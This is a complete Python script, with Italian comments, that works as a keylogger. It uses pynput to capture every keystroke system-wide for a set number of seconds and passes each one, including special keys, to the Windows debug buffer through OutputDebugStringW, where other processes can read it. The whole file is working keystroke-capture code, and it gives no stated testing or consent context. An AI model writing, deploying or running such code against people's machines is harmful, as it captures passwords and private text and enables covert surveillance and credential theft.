import ctypes
import sys
import time
from pynput import keyboard

# Funzione per inviare la stringa al buffer di debug di Windows
def log_to_debug(message):
    try:
        ctypes.windll.kernel32.OutputDebugStringW(message)
    except Exception:
        pass

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            msg = key.char
        elif key == keyboard.Key.space:
            msg = " "
        elif key == keyboard.Key.enter:
            msg = "\n"
        else:
            msg = f"[{key}]"
        
        log_to_debug(msg)
    except Exception:
        pass

def main():
    # Controllo degli argomenti da riga di comando
    if len(sys.argv) != 2:
        print("Uso: python nome_script.py <secondi>")
        sys.exit(1)

    try:
        duration = int(sys.argv[1])
    except ValueError:
        print("Errore: Il valore deve essere un numero intero (secondi).")
        sys.exit(1)

    # Avvia il listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Attesa per la durata specificata
    time.sleep(duration)
    
    # Fermata del listener
    listener.stop()

if __name__ == "__main__":
    main()
